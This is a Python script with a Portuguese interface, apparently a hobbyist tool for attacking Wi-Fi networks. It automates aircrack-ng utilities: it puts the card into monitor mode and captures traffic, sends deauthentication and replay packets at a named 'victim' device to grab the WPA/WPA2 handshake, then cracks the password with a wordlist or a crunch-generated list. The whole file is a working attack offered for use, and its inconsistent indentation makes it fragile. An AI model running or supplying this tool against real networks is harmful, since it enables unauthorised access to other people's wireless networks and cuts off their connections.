#!/usr/bin/env python
# -*- coding: utf-8 -*- 

# Code: Igor Matsunaga - NSW
# Site: https://nsworld.com.br
# Github: https://github.com/igorMatsunaga

import os

os.system('clear')

logo = '''

 ███▄    █   ██████  █     █░ ▒█████   ██▀███   ██▓    ▓█████▄ 
 ██ ▀█   █ ▒██    ▒ ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒▓██▒    ▒██▀ ██▌
▓██  ▀█ ██▒░ ▓██▄   ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▒██░    ░██   █▌
▓██▒  ▐▌██▒  ▒   ██▒░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▒██░    ░▓█▄   ▌
▒██░   ▓██░▒██████▒▒░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒░██████▒░▒████▓ 
░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░▓  ░ ▒▒▓  ▒ 
░ ░░   ░ ▒░░ ░▒  ░ ░  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░ ▒  ░ ░ ▒  ▒ 
   ░   ░ ░ ░  ░  ░    ░   ░  ░ ░ ░ ▒    ░░   ░   ░ ░    ░ ░  ░ 
         ░       ░      ░        ░ ░     ░         ░  ░   ░    
                                                        ░      
'''

print('\033[31m'+ logo +'\033[0;0m')

print("----------------------------------------------------------------------------------------------")
print("-------------------------------------NSWORLD--------------------------------------------------")
print("----------------------------------------------------------------------------------------------")
print("Certifique-se que sua placa suporta modo moitoramento e injeção, para que esse ataque funcione")


def dos():
        os.system("gnome-terminal -- aireplay-ng -1 0 -e " + essid + " -a " + bssid + " -h " + mac + ' ' + inter + "mon") 
        os.system("gnome-terminal -- aireplay-ng -3 -b " + bssid + " -h " + mac + ' ' + inter + "mon")
        os.system("gnome-terminal -- aireplay-ng --deauth 1 -a " + bssid + " -c " + mac + ' ' + inter + "mon")

def crack():
	print("Aguarde o handshake")
    	quebra = raw_input('\033[31m'+ "Digite (c) após capturar o handshake (r) para atacar novamente ou qualquer outra tecla para sair: "+'\033[0;0m')
    	if(quebra == 'c' and rede == '2'):
			dec = raw_input("Digite (p) para utilizar uma lista ou digite (d) para criar uma lista: ")
			if(dec == 'p'):
				lista = raw_input("Digite o caminho da sua lista: ")
    				os.system("aircrack-ng -w " + lista + " -b " +  bssid + ' ' + saida + "-01.cap")			

			if(dec == 'd'):
				crunch()	
			else:
				return crack	
	if(quebra == 'c' and rede == 'w'):
			os.system("aircrack-ng " + saida + "-01.cap")
			

	elif(quebra == 'r'):
		dos()
	       	return crack()
	else:
		os.system("airmon-ng stop" + ' ' + inter + "mon" )
		os.system("ifconfig" + ' ' + inter + "mon" + " up") 
		os.system("/etc/init.d/network-manager restart ")
		os.system("clear")
	

def crunch():
    global mini, maxi, cara
    mini = raw_input("Digite o minimo de caracteres que deseja na lista: ")
    maxi = raw_input("Digite o maximo caracteres que deseja na lista: ")
    cara = raw_input("Insira os caracteres que deseja utilizar(ex: abcdABCD1234!@#$: ")
   
    novo = os.system("crunch " + mini + " " + maxi + " " + cara + " -o lista.txt")
    os.system("aircrack-ng -w lista.txt -b "  +  bssid + ' ' + saida +  "-01.cap")

def executar():
    global canal, bssid, essid, mac, inter, saida, rede
    c = "c"
    s = "s"
    ent = input("Tecle (c) para 'C'ontinuar ou (s) para 'S'air: ")
    if(ent == c):
    	inter = raw_input("Digite sua interface de rede (ex: wlan0): ")
    	limpar = raw_input("Matar os processos? Digite (s) para 'S'im ou (n) para 'N'ão: ")
    	if(limpar == s):
    		os.system("airmon-ng check kill")
		os.system("airmon-ng start" + ' ' + inter)
    		os.system("gnome-terminal -- airodump-ng" + ' ' + inter + "mon") 
    	else:	
    		os.system("airmon-ng start" + ' ' + inter)
    		os.system("gnome-terminal -- airodump-ng" + ' ' + inter + "mon") 
	os.system("clear")
	rede = raw_input("Digite 'w' para WPA ou '2' para WPA2: ")
    	canal = raw_input("Digite o canal da rede: ")
    	bssid = raw_input("Digite o BSSID da rede escolhida: ")
	essid = raw_input("Digite o ESSID da rede escolhida: ")
    	mac = raw_input("Digite o MAC(station) da vitima: ")
    	saida = raw_input("Digite o nome para o arquivo de saida: ")
        os.system("gnome-terminal -- airodump-ng -c " + canal + " --bssid " + bssid + " -w " + saida + ' ' + inter + "mon")
	os.system("clear")
	dos()	         	
	crack()
		

executar()

